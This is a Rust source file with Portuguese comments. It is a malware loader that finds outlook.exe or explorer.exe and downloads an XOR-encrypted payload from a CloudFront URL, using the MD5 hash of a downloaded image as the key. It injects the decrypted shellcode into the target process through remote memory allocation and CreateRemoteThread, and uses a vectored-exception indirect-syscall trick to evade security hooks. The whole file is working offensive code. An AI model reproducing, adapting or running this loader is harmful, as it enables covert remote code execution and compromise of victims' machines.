extern crate winapi;

use winapi::um::winnt::{EXCEPTION_POINTERS, PROCESS_ALL_ACCESS, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};
use winapi::um::libloaderapi::GetModuleHandleA;
use winapi::um::errhandlingapi::AddVectoredExceptionHandler;
use winapi::um::processthreadsapi::{OpenProcess};
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory, VirtualProtectEx};
use winapi::um::handleapi::INVALID_HANDLE_VALUE;
use winapi::um::processthreadsapi::{CreateRemoteThread};
use winapi::um::minwinbase::EXCEPTION_ACCESS_VIOLATION;
use winapi::vc::excpt::EXCEPTION_CONTINUE_EXECUTION;
use winapi::um::libloaderapi::GetProcAddress;
use std::ffi::CString;
use std::ptr::null_mut;
use std::mem::size_of_val;
use reqwest::blocking::get;
use reqwest;
use tokio;
use sysinfo::{System, SystemExt, ProcessExt, Pid, PidExt};
use md5;

#[allow(non_snake_case)]
fn SetSysCall(offset: u32) -> u64 {
    // Implementação em Rust para definir syscall, se necessário
    unimplemented!()
}

#[allow(non_snake_case)]
fn FindSyscallAddr(base: usize) -> *mut u8 {
    let mut func_base = base as *mut u8;
    let mut temp_base: *mut u8 = null_mut();

    // 0F05 syscall
    unsafe {
        while *func_base != 0xc3 {
            temp_base = func_base;
            if *temp_base == 0x0f {
                temp_base = temp_base.add(1);
                if *temp_base == 0x05 {
                    temp_base = temp_base.add(1);
                    if *temp_base == 0xc3 {
                        return func_base;
                    }
                }
            } else {
                func_base = func_base.add(1);
                temp_base = null_mut();
            }
        }
    }

    temp_base
}

static mut G_SYSCALL_ADDR: usize = 0;

#[allow(non_snake_case)]
extern "system" fn HandleException(exception_ptr: *mut EXCEPTION_POINTERS) -> i32 {
    unsafe {
        if (*(*exception_ptr).ExceptionRecord).ExceptionCode == EXCEPTION_ACCESS_VIOLATION {
            let context = &mut *(*exception_ptr).ContextRecord;
            context.R10 = context.Rcx;
            context.Rax = context.Rip;
            context.Rip = G_SYSCALL_ADDR as u64;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    0
}

fn VectoredSyscalPOC(payload: &[u8], pid: u32) {
    unsafe {
        let ntdll = GetModuleHandleA(CString::new("ntdll.dll").unwrap().as_ptr());
        let drawtext = GetProcAddress(ntdll, CString::new("ZwDrawText").unwrap().as_ptr());

        if drawtext.is_null() {
            eprintln!("[-] Error GetProcess Address");
            std::process::exit(-1);
        }

        let syscall_addr = FindSyscallAddr(drawtext as usize);
        if syscall_addr.is_null() {
            eprintln!("[-] Error Resolving syscall Address");
            std::process::exit(-1);
        }

        G_SYSCALL_ADDR = syscall_addr as usize;

        AddVectoredExceptionHandler(1, Some(HandleException));

        let h_process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if h_process == INVALID_HANDLE_VALUE {
            eprintln!("[-] Failed to Open Process");
            std::process::exit(-1);
        }

        let remote_base = VirtualAllocEx(
            h_process,
            null_mut(),
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if remote_base.is_null() {
            eprintln!("[-] Remote Allocation Failed");
            std::process::exit(-1);
        }

        let mut bytes_written = 0;
        if WriteProcessMemory(
            h_process,
            remote_base,
            payload.as_ptr() as *const _,
            payload.len(),
            &mut bytes_written,
        ) == 0
        {
            eprintln!("[-] Failed to write payload in remote process");
            std::process::exit(-1);
        }

        let mut old_protection = 0;
        if VirtualProtectEx(
            h_process,
            remote_base,
            payload.len(),
            PAGE_EXECUTE_READ,
            &mut old_protection,
        ) == 0
        {
            eprintln!("[-] Failed to change memory protection from RW to RX");
            std::process::exit(-1);
        }

        let h_thread = CreateRemoteThread(
            h_process,
            null_mut(),
            0,
            Some(std::mem::transmute(remote_base)),
            null_mut(),
            0,
            null_mut(),
        );

        if h_thread.is_null() {
            eprintln!("[-] Failed to Execute Remote Thread");
            std::process::exit(-1);
        }

        println!("[+] Injected shellcode!!");
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let process_name_primary = "outlook.exe"; // Nome do processo a ser procurado
    //let pid = find_process_id(process_name);
    let process_name_fallback = "explorer.exe"; // Nome do processo secundário a ser procurado

    let pid = find_process_id(process_name_primary).or_else(|| find_process_id(process_name_fallback));


    match pid {
        Some(pid) => {
            println!("Processo encontrado com PID: {}", pid);

            let loader_url = "https://d3qlvo7dokg9tf.cloudfront.net/redsc";
            let image_url = "https://d3qlvo7dokg9tf.cloudfront.net/imagem.jpg";

            // Baixar e calcular o MD5 da imagem
            let xor_key = download_and_calculate_md5(image_url).await?;

            // Converta a chave XOR para uma string hexadecimal e imprima
            let xor_key_hex: String = xor_key.iter().map(|b| format!("{:02x}", b)).collect();
            //println!("Chave XOR (MD5 de imagem.jpg): {}", xor_key_hex);

            // Baixar o payload criptografado
            let response = reqwest::get(loader_url).await.expect("Falha ao fazer a requisição");
            let encrypted_payload: Vec<u8> = response.bytes().await.expect("Falha ao ler os bytes").to_vec();

            // Descriptografar o payload usando a chave MD5
            let decrypted_payload: Vec<u8> = encrypted_payload.iter().zip(xor_key.iter().cycle()).map(|(&b, &k)| b ^ k).collect();

            // Imprimir o shellcode decodificado como array de bytes
            //print_shellcode_as_array(&decrypted_payload);

            // Chamar VectoredSyscalPOC com o payload descriptografado
            VectoredSyscalPOC(&decrypted_payload,  pid.as_u32());
        }
        None => {
            println!("Nenhum dos processos encontrados.");
        }
    }

    Ok(())
}

async fn download_and_calculate_md5(url: &str) -> Result<[u8; 16], Box<dyn std::error::Error>> {
    // Baixar a imagem
    let response = reqwest::get(url).await?;
    let bytes = response.bytes().await?;

    // Calcular o hash MD5
    let digest = md5::compute(&bytes);
    let mut key = [0u8; 16];
    key.copy_from_slice(&digest.0);

    Ok(key)
}

fn find_process_id(process_name: &str) -> Option<Pid> {
    // Cria uma nova instância do System
    let mut sys = System::new_all();

    // Atualiza as informações do sistema
    sys.refresh_all();

    // Itera sobre todos os processos e encontra o que corresponde ao nome do processo
    for (pid, process) in sys.processes() {
        if process.name().eq_ignore_ascii_case(process_name) {
            return Some(*pid);
        }
    }

    // Retorna None se o processo não for encontrado
    None
}

//fn print_shellcode_as_array(shellcode: &[u8]) {
//    print!("let buf: [u8; {}] = [\n    ", shellcode.len());
//    for (i, byte) in shellcode.iter().enumerate() {
//        if i % 12 == 0 && i != 0 {
//            print!("\n    ");
//        }
//        print!("0x{:02x}, ", byte);
//    }
//    println!("\n];");
//}